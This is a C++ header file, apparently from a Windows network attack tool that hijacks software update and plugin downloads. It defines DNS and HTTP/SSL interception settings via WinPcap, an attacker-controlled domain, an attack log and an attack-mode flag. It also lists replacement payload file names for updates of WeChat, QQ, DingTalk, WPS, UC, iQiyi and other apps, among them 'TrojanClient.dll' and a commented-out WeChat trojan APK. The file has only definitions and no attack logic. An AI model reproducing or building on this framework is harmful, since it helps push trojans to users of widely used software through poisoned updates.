#ifndef ATTACKER_H_H_H
#define ATTACKER_H_H_H


#include <windows.h>
#include <vector>

#include <string>

using namespace std;

#define TVKPLUGIN_MODULE_NAME				"TvkPlugin"
#define PLAYERCORENEON_MODULE_NAME			"player_core_neon"
#define P2PPLUGIN_MODULE_NAME				"p2p"
#define PLAYERCORENEONAPI21_MODULE_NAME		"player_core_neon_api21"


#define QQTVKPLUGIN_PACKET_NAME				"TvkPlugin.zip"
#define PLAYERCORENEON_PACKET_NAME			"player_core_neon.zip"
#define P2PPLUGIN_PACKET_NAME				"libp2pproxy.zip"
#define PLAYERCORENEONAPI21_PACKET_NAME		"player_core_neon_api21.zip"

#define  SHUQI_PLUGIN_ZIP_FILENAME "shuqi_plugin.zip"

#define TARGET_INFO_TAG					WM_USER + 0x100






#define DNS_PORT							53
#define	SSL_PORT							443	
#define HTTP_PORT							80
#define INFORMER_PORT						65534

#define DNS_PACKET_LIMIT					512	
#define MTU									1518
#define MAC_ADDRESS_SIZE					6	
#define WSASTARTUP_VERSION					0x0202
//#define MAX_LISTEN_COUNT					256

#define MAX_URL_SIZE						4096
#define MAX_RESPONSE_HEADER_SIZE			4096
#define MAX_SINGLE_PACKET_SIZE				4096


#define LOCAL_QUERY_DNS_ID					0xfedc
#define LOCAL_DNS_QUERY_SERVER				0x72727272
//#define LOCAL_DNS_QUERY_SERVER				0x08080808

//#define G_USERNAME						"test20181216"
//#define G_USERNAME						"test20181205"
//#define G_USERNAME						"test20190220"
//#define G_USERNAME						"test20181214"
//#define G_USERNAME						"test20190319"
//#define G_USERNAME						"test20190326"
//#define G_USERNAME						"test20190330"
//#define G_USERNAME						"test20190331"
//#define G_USERNAME						"test20190402"
//#define G_USERNAME						"test20190404"
//#define G_USERNAME						"test20190410"
//#define G_USERNAME						"test20190413"

extern char G_USERNAME[64];

extern int gAttackMode;

//extern char DEFAULT_USERNAME[64];

#define SERVER_USERNAME					"server"

// #define LOVEMEQQDOTCOM_DOMAINNAME		"lovemeqq.com"
// #define ASSISTSQQDOTCOM_DOMAINNAME		"assistsqq.com"
// #define LIUJINGUANGSDNTOP				"liujinguangsdn.top"
#define MYOWNSITE_ATTACK_DOMAINNAME		"debugqq.com"




#define ATTACK_LOG_FILENAME					"attack.log" 
#define ERROR_LOG_FILENAME					"error.log"

#define CRLN								"\r\n"
#define CRLNLINUX							"\n"
#define WINPCAP_NETCARD_NAME_PREFIX			"\\Device\\NPF_"
#define CONFIG_FILENAME						"config.ini"
#define DNS_FILENAME						"dns.ini"
//#define URL_INIT_FILENAME					"url.txt"


//plugin

#define BAOFENGSO_REPLACE_FILENAME			"baofengso.zip"
#define QQNEWS_VIDEO_SO_PACKAGENAME			"video_so.zip"
#define Browser2345FileName					"browser2345.apk"

#define DUOMIMUSIC_FILE_NAME				"duomimusic.zip"

#define YOUKUPLUGIN_FILE_NAME				"youkuplugin.apk"

#define IQIYI_PLUGIN_FILENAME				"android.app.fw.zip"

#define BAOTOUTIAO_FILENAME					"baotoutiao.zip"

//extern char ANDROID_REPLACE_FILENAME[256];
#define ANDROID_REPLACE_FILENAME			"baidu_setup.apk"
//#define WEIXIN_APK_TROJAN_FILENAME				"weixin_setup.apk"

#define STORMPLAYER_VOICE1_FILENAME			"baofengvoice1.zip"
#define STORMPLAYER_UPDATE_CONFIG_FILENAME	"baofeng_apk_updatelist.txt"

#define OPPOBROWSER_FILE_NAME				"oppobrowser.apk"

#define XIMALAYA_REACTNATIVE_FILENAME		"reactnative.apk"
#define QQMUSIC_ANDROID_PLUGIN_FN			"qqmusic_plugin.zip"
#define QQ_ANDROID_NOWPLUGIN_FN				"qqnowbiz.zip"
#define QQ_ANDROID_NOWPLUGIN1_FN				"qqnowbiz1.zip"
#define QUKAN_PLUGIN_FILENAME				"qukanhotfix.zip"

//pc
#define QQMINIBROWSER_FILE_NAME				"QQminibrowser.zip"
#define THUNDERSDKUPDATE_FILE_NAME			"thundersdkupdate.zip"
#define WPS_UpdatePatch_PACKAGENAME			"WPS_UpdatePatch.exe"
//#define XUNLEI_UpdatePatch_PACKAGENAME		"xunlei_MsgCenterEx.zip"
//#define XUNLEIGAMEBOX_FILE_NAME				"xunleigamebox.zip"

#define DLLTROJAN_FILE_NAME					"TrojanClient.dll"
#define DLLTROJAN_FILE_NAME64				"TrojanClient64.dll"

#define IQIYI_DOWNLOADHELPER_FILENAME		"DownloadHelper.dll"
#define QQLIVEDLL_FILENAME					"wpsrp.dll"
#define IQIYI_PC_UPDATE_FILENAME			"QiyiService.exe"

#define ALIBABA_ALIAPPLOADER_FILENAME		"AliAppLoader.exe"
#define ALIBABA_ALIFILECHECK_FILENAME		"AliFileCheck.exe"

#define SIMCARD_APK_FILENAME				"simcard.apk"


//sslplugin
//不要对新的zip包签名
//#define UCGAMERTA_UPDATE_FILENAME				"ucgame-rta.apk"
#define UCGAME_UPDATE_FILENAME					"ucgame.apk"
//#define UCLIVE_UPDATE_FILENAME					"uclive.apk"
#define UCPPAPPSTORE_UPDATE_FILENAME			"ppappstore.apk"	//不要对新的zip包签名
#define UCAMAP_UPDATE_FILENAME					"amap_build.apk"
#define UCALOPHA_UPDATE_FILENAME				"aloha_build.apk"	//不要对新的zip包签名
#define UCREACTIVE_UPDATE_FILENAME				"reactnative.apk"

#define QQMTT_UPDATE_ZIP_FILENAME				"mtt_filemanager.apk"
#define WEIXIN_ANDROID_PLUGIN_UPDATE_FILENAME	"xwebruntime.zip"
#define WEIXIN_ANDROID_XFILESPPT_FILENAME		"xfilesPPTReader.zip"
#define WEIXIN_ANDROID_JS_UPDATE_FILENAME		"wxAndroidJsUpdate.htm"

//不要对新的zip包签名
#define TOUTIAO1_FILENAME					"toutiao1.zip"
#define TOUTIAO2_FILENAME					"toutiao2.zip"

//pc
#define WEIXIN_PC_UPDATE_ZIP_FILENAME			"WeChat.zip"
#define WEIXIN_PC_UPDATE_EXE_FILENAME			"WeChat.exe"

#define DINGDINGUPDATE_EXE_FILENAME				"DingTalk.exe"
#define DINGDINGUPDATE_ZIP_FILENAME				"DingTalk.zip"
#define QQMUSIC_UPDATE_FN						"QQMusicForYQQ.exe"

//qq
#define QQGTIMG_ZIP_FILENAME					"libwxvoiceembed.zip"






#define HTTPMETHOD_GET		1
#define HTTPMETHOD_POST		2
#define HTTPMETHOD_PUT		3
#define HTTPMETHOD_HEAD		4




#endif